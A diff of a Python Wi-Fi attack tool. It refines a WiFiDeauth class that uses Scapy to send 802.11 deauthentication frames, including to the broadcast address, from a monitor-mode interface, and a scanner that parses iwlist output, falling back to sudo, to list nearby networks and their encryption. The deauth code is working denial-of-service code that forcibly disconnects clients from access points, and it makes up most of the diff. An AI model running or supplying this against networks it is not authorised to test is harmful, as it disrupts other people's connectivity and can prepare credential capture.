@@ -171,46 +171,58 @@ class WiFiDeauth:
             print(f"Error disabling monitor mode: {e}")
             return False
     
-    def deauth(self, target_mac: str, ap_mac: str, count: int = 1, 
+    def deauth(self, target_mac: str, ap_mac: str, count: int = 1,
                reason: int = 7) -> bool:
         """
-        Send deauthentication packets
-        
+        Send deauthentication packets.
+
         Args:
             target_mac: Client MAC to deauth (or ff:ff:ff:ff:ff:ff for broadcast)
             ap_mac: Access Point BSSID
-            count: Number of packets to send
-            reason: Deauth reason code (7 = Class 3 frame received from nonassociated STA)
+            count: Number of deauth frames to send
+            reason: 802.11 deauth reason code (7 = Class 3 frame from non-assoc STA)
         """
         if not SCAPY_AVAILABLE:
             raise Exception("Scapy not available")
-        
+
+        # Resolve the interface before anything else
+        interface = self.monitor_interface or self.interface
+        if not interface:
+            raise ValueError(
+                "No wireless interface configured. "
+                "Call enable_monitor_mode() or set self.interface first."
+            )
+
         if not self.is_monitor_mode and platform.system().lower() == 'linux':
-            raise Exception("Monitor mode not enabled. Call enable_monitor_mode() first.")
-        
+            raise Exception(
+                "Monitor mode not enabled. Call enable_monitor_mode() first."
+            )
+
+        # Validate MACs to prevent garbage frames / injection
+        _mac_re = re.compile(r'^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$')
+        for label, addr in [('target_mac', target_mac), ('ap_mac', ap_mac)]:
+            normalised = addr.replace('-', ':')
+            is_broadcast = normalised.lower() == 'ff:ff:ff:ff:ff:ff'
+            if not is_broadcast and not _mac_re.match(normalised):
+                raise ValueError(f"Invalid {label}: {addr!r}")
+
         try:
-            # Create deauth packet
-            # RadioTap header + 802.11 + Deauth
             packet = (
                 RadioTap() /
                 Dot11(
-                    type=0,        # Management frame
-                    subtype=12,    # Deauthentication
-                    addr1=target_mac,  # Destination
-                    addr2=ap_mac,      # Source (AP)
-                    addr3=ap_mac       # BSSID
+                    type=0,
+                    subtype=12,
+                    addr1=target_mac,
+                    addr2=ap_mac,
+                    addr3=ap_mac
                 ) /
                 Dot11Deauth(reason=reason)
             )
-            
-            # Send packets
-            interface = self.monitor_interface or self.interface
             sendp(packet, iface=interface, count=count, inter=0.1, verbose=False)
-            
             return True
-            
+
         except Exception as e:
-            print(f"Deauth error: {e}")
+            print(f"Deauth error on {interface}: {e}")
             return False
     
     def start_deauth_attack(self, target_mac: str, ap_mac: str, 
@@ -347,22 +359,28 @@ class WiFiScanner:
         return networks
     
     def scan_networks_linux(self) -> List[Dict]:
-        """Scan WiFi networks on Linux"""
+        """Scan WiFi networks on Linux using iwlist (with sudo fallback)."""
         networks = []
-        
-        try:
-            # Use iw or iwlist
-            output = subprocess.check_output(
-                ['sudo', 'iwlist', self.interface or 'wlan0', 'scan'],
-                text=True,
-                stderr=subprocess.DEVNULL
+        iface = self.interface or 'wlan0'
+
+        def _run_iwlist(use_sudo: bool) -> str:
+            cmd = (['sudo'] if use_sudo else []) + ['iwlist', iface, 'scan']
+            return subprocess.check_output(
+                cmd, text=True, stderr=subprocess.DEVNULL, timeout=30
             )
-            
-            current_network = {}
-            
+
+        try:
+            try:
+                output = _run_iwlist(use_sudo=False)
+            except (subprocess.CalledProcessError, PermissionError):
+                # Some kernels require elevated privileges for scanning
+                output = _run_iwlist(use_sudo=True)
+
+            current_network: Dict = {}
+
             for line in output.split('\n'):
                 line = line.strip()
-                
+
                 if 'Cell' in line and 'Address' in line:
                     if current_network.get('bssid'):
                         networks.append(current_network)
@@ -370,29 +388,36 @@ class WiFiScanner:
                     match = re.search(r'Address: ([0-9A-Fa-f:]+)', line)
                     if match:
                         current_network['bssid'] = match.group(1).upper()
-                
+
                 elif 'ESSID' in line:
                     match = re.search(r'ESSID:"([^"]*)"', line)
                     if match:
                         current_network['ssid'] = match.group(1)
-                
-                elif 'Channel' in line:
+
+                elif 'Channel:' in line and 'Channel' not in current_network:
                     match = re.search(r'Channel:(\d+)', line)
                     if match:
                         current_network['channel'] = int(match.group(1))
-                
+
                 elif 'Signal level' in line:
-                    match = re.search(r'Signal level[=:](-?\d+)', line)
+                    # Convert dBm to 0-100 percentage (−100 dBm = 0%, 0 dBm = 100%)
+                    match = re.search(r'Signal level[=:](-?\d+)\s*dBm', line)
                     if match:
-                        current_network['signal'] = int(match.group(1))
-                
+                        dbm = int(match.group(1))
+                        current_network['signal'] = min(100, max(0, 2 * (dbm + 100)))
+                    else:
+                        match = re.search(r'Signal level[=:](\d+)/100', line)
+                        if match:
+                            current_network['signal'] = int(match.group(1))
+
                 elif 'Encryption key' in line:
-                    if 'on' in line.lower():
-                        current_network['encrypted'] = True
-                
-                elif 'WPA' in line or 'WPA2' in line:
-                    current_network['encryption'] = 'WPA2' if 'WPA2' in line else 'WPA'
-            
+                    current_network['encrypted'] = 'on' in line.lower()
+
+                elif 'WPA2' in line:
+                    current_network['encryption'] = 'WPA2'
+                elif 'WPA' in line and 'encryption' not in current_network:
+                    current_network['encryption'] = 'WPA'
+
             if current_network.get('bssid'):
                 networks.append(current_network)
                 
